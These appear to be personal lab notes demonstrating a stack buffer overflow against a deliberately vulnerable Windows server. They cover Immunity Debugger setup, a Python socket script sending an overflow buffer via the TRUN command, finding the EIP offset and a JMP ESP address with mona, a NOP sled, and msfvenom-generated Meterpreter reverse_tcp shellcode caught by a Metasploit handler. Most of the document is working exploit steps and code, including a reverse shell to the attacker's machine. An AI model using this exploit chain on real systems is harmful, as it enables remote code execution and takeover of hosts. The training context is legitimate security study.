DEMO NOTES:

open secureserverind.exe in immunity debugger:
run the executable file.
now i can go to file > attatch > select the running program to debug.

now for my python script on a remote machine:

  #!/usr/bin/python2.7             ## use python 2.7 or you might get some error with bytes like objects.
  import socket
  buf = "TRUN /.:/"   #2002 vs 2003
  buf += <5000 length buffer overflow payload>
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("10.50.36.141", 9999))
  print(s.recv(1024))
  s.send(buf)
  print(s.recv(1024))
  s.close()
  
Now I should see the core dumped in immunity debugger. 
EIP is: 386F4337
running that back through wiremask should give me a value of 2003

Now change buf in the python script to:
buf += "A" * 2003

now crash it again

in immunity debugger, go to the bottom bar to look for jump esp instructions.
use the query:
 !mona jmp -r esp -m "essfunc.dll"
This should bring up a "log data" window that has addresses from the search.

{
  0x625012A0
}

now I can add to my python script:

  buf += "\xA0\x12\x50\x62"
  buf += "\x90" * 10




Now were gonna make the shell code

msfconsole
use multi/handler
show options

set payload windows/meterpreter/reverse_tcp
set LHOST <local machine ip address>

msfvenom -p windows/meterpreter/reverse_tcp lhost=<local public ip> lport=4444 -b "\x00" -f python

now do the exploit:
1) make sure server is running
2) run the exploit
3) now use the handler in msfconsole














